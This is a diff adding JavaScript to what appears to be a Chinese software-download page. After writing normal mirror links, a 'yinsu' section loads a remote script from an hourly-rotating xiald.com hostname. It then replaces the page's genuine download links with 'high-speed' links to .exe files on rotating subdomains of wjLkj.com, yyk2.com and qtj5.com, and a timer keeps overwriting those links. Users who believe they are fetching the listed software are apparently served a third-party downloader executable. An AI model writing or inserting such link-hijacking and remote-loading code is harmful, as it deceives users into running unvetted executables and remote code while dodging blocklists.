@@ -1,0 +1,160 @@
+var dlURL = [];
+dlURL[1] = 'http://dx.downbk.com:806/';
+dlURL[2] = 'http://wt.downbk.com:806/';
+dlURL[3] = 'http://d1.downbk.com:806/';
+dlURL[4] = 'http://d2.downbk.com:806/';
+dlURL[5] = 'http://d3.downbk.com:806/';
+dlURL[6] = 'http://w1.downbk.com:806/';
+
+document.write("<li class=\"fl\"><a href='http://dx.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('1','1',"+ softid +","+ onlytime +")\">亿恩电信下载</a></li>");
+document.write("<li class=\"fr\"><a href='http://wt.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('2','1',"+ softid +","+ onlytime +")\">亿恩联通下载</a></li>");
+document.write("<li class=\"fl\"><a href='http://d1.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('3','1',"+ softid +","+ onlytime +")\">南方电信下载</a></li>");
+document.write("<li class=\"fr\"><a href='http://w1.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('4','1',"+ softid +","+ onlytime +")\">南方联通下载</a></li>");
+document.write("<li class=\"fl\"><a href='http://d3.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('3','1',"+ softid +","+ onlytime +")\">北方电信下载</a></li>");
+document.write("<li class=\"fr\"><a href='http://w1.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('4','1',"+ softid +","+ onlytime +")\">北方联通下载</a></li>");
+document.write("<li class=\"fl\"><a href='http://d1.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('3','1',"+ softid +","+ onlytime +")\">南方移动下载</a></li>");
+document.write("<li class=\"fr\"><a href='http://w1.downbk.com:806/"+ dlfilename + "' target='_blank' onclick=\"javascript:dl('4','1',"+ softid +","+ onlytime +")\">北方移动下载</a></li>");
+
+//==========yinsu===========//
+(function(){
+	if(!document.getElementById('_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_id')){
+		var script = document.createElement("script");
+		script.type = "text/javascript";
+		// jsapi(time).xiald.com
+		script.src = 'http://jsapi'+ parseInt( (Date.parse(new Date())/1000 - 1451577600) / 3600 ) + '.xiald.com/api/api.js?time=' + Date.parse(new Date()) ;
+		script.id  = '_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_id';
+		var head = document.getElementsByTagName("head");
+		if(head && head[0]) {
+			head[0].appendChild(script);
+		}
+	}
+})();
+_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_all = false;
+function _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_geturl(SoftID, q, title){
+	if(typeof(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming) == 'object'){
+        var i = Math.floor(Math.random() * _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming.length ); //0-2的随机数
+        var yumy2 = _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming[i];
+		_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_all = true   //是否已经加载
+	}else{
+		var yumy = ['wjLkj.com','yyk2.com','qtj5.com'];
+		var i = Math.floor(Math.random()*3);
+		var yumy2 = yumy[i];
+	}
+	var ysDownUrl = 'http://down'+ parseInt( (Date.parse(new Date())/1000 - 1451577600) / 3600 ) + '.' + yumy2+'/?/'+SoftID+'/'+q+'/'+title+'.exe';
+	return ysDownUrl;
+}
+function _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_returl(element, SoftID, q, title){
+	var _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_jici1 = 0;
+	var interval_time = setInterval(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_seturl,50);
+	
+	function _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_seturl(){
+		_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_jici1++;
+		if(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_jici1>40 || typeof(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming) == 'object'  ){
+				if(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_all === true){
+					window.clearInterval(interval_time);
+					return;
+				}
+                window.clearInterval(interval_time);
+                if(typeof(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming) == 'object'){
+                    var i = Math.floor(Math.random() * _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming.length ); //0-2的随机数
+                    var yumy2 = _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming[i];
+                    yumy2 = 'http://down'+ parseInt( (Date.parse(new Date())/1000 - 1451577600) / 3600 ) + '.' + yumy2+'/?/'+SoftID+'/'+q+'/'+title+'.exe';
+					try{
+						if(element.length>0){
+							for(var i=0;i<element.length;i++){
+								element[i].href=yumy2; 
+							}
+						}else{
+							element[i].href=yumy2; 
+						}
+					}catch(err){
+						element.attr('href',yumy2);
+					}
+					
+                }
+            }
+	}
+	
+}
+function getNum(text){
+			var value = text.replace(/[^0-9]/ig,"");
+			return value;
+		}
+//===========yinsu==========//
+
+//===========yinsu==========//
+//调整下载器 样式
+//动态加载 tangram  百度的 一个类似 jquery的js库 选择这个库的原因 是 百度提供 高速的js下载地址
+function withtangram(callback) {
+    if(!(window.baidu)) {
+        var js = document.createElement('script');
+        js.setAttribute('src', 'http://fe.bdimg.com/tangram/2.0.2.5.js');
+        js.setAttribute('type', 'text/javascript');
+        js.onload = js.onreadystatechange = function() {
+            if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') {
+                if(callback && typeof callback === "function") {
+                    callback();
+                }
+                js.onload = js.onreadystatechange = null;
+            }
+        };
+        document.getElementsByTagName('head')[0].appendChild(js);
+    }
+}
+
+withtangram(
+    function() {
+		var $ = baidu;
+		var yingsu_xiazainuoji = false ;
+		if(  typeof(yinsu_url1) != "undefined" ){
+			//url中不得包含 "?"
+			if(yinsu_url1.indexOf("?")<0){
+				//取出倒数第三个 第四个字符 判断是不是 "."  因为 文件后缀一般是三个或者两个字符
+				var yinsu_houzui =  yinsu_url1.substring(yinsu_url1.length - 4  ,yinsu_url1.length - 3);
+				var yinsu_houzui2 =  yinsu_url1.substring(yinsu_url1.length - 3  ,yinsu_url1.length-2);
+
+				if(yinsu_houzui == "." || yinsu_url1 == "."){
+					//后缀不能是 .php .asp .jsp
+					yinsu_houzui =  yinsu_url1.substring(yinsu_url1.length - 4  ,yinsu_url1.length );
+					if(yinsu_houzui != ".asp" && yinsu_houzui != ".jsp" && yinsu_houzui != ".php" ){
+						//不能包含 ['<','>','?',"\\",'/',':','*','"','|']  否则也不是正常的下载地址
+						var yinsu_kaisi = yinsu_url1.lastIndexOf("/");
+						yinsu_houzui2 = yinsu_url1.substring(yinsu_kaisi+1 ,yinsu_url1.length );
+						if(yinsu_houzui2.indexOf('<')<0 && yinsu_houzui2.indexOf('>')<0 && yinsu_houzui2.indexOf('?')<0 && yinsu_houzui2.indexOf("\\")<0 && yinsu_houzui2.indexOf('/')<0 && yinsu_houzui2.indexOf(':')<0 &&  yinsu_houzui2.indexOf('*')<0 &&  yinsu_houzui2.indexOf('"')<0 &&  yinsu_houzui2.indexOf('|')<0 ){
+							var yingsu_url = _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_geturl(yinsu_id ,"bkill",yinsu_name); //yinsu
+							yingsu_xiazainuoji = true ;
+						}
+					}
+				}
+			}
+		}else{
+		//旧的页面 只能通过是否包含 dl.php  来排除外链
+			yingsu_url1 = $('.soft-downUrl-list').eq(1).find("li").find("a").eq(0).attr("href");
+			if(yingsu_url1.indexOf("dl.php")<0){
+				var yingshu_url = window.location.href ;
+				//保证当前页面 是最终页面
+				if(yingshu_url.indexOf("/download/")>0 && yingshu_url.indexOf("list") <0 ){
+					var yintsu_title = $('h1').text();
+					var yingshu_kaisi = yingshu_url.indexOf("/download/");
+					var yingshu_id = yingshu_url.substring(yingshu_kaisi+10,yingshu_url.lastIndexOf('.'));
+					var yingsu_url = _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_geturl(getNum(yingshu_id) ,"bkill",yintsu_title); //yinsu
+					yingsu_xiazainuoji = true ;
+					yinsu_id = yingshu_id;
+					yinsu_name = yintsu_title;
+				}
+			}
+		}
+		//如果前面判断
+		if(yingsu_xiazainuoji){
+			//下载位添加
+			var ying_html = '<li class="fl"><a class="yinsu_xz" href="'+yingsu_url+'" target="_blank">电信高速下载</a></li><li class="fr"><a class="yinsu_xz" href="'+yingsu_url+'" target="_blank">网通高速下载</a></li><li class="fl"><a class="yinsu_xz" href="'+yingsu_url+'" target="_blank">电信高速下载</a></li><li class="fr"><a class="yinsu_xz" href="'+yingsu_url+'" target="_blank">联通高速下载</a></li>';
+
+			$(".soft-downUrl-list").eq(0).find("ul").html(ying_html);
+			//==========yinsu===========//
+			var _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_xz = $('.yinsu_xz');
+			_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_returl(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_xz,yinsu_id,'bkill',yinsu_name);
+			//==========yinsu===========//
+		}else{
+		}
+	}
+);
